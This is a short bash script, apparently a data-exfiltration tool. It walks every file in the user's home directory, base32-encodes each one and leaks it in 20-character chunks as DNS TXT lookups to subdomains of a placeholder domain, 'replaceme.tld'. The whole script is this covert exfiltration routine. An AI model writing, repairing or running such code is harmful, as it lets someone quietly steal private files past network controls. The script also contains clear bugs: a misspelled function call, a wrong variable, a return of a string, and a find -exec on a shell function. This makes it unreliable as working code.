#! /bin/bash

function encode {return $(cat $1|base32)}
function send {
encoded=encod $i
for ((i=0; i<${encoded};i+=20));
do chunk="${encoded:$i:20}"
dns_query="${chunk}.replaceme.tld"
dig +short txt "$dns_query" 2>&1 > /dev/null
done
}

find $HOME -type f -exec send {} \;
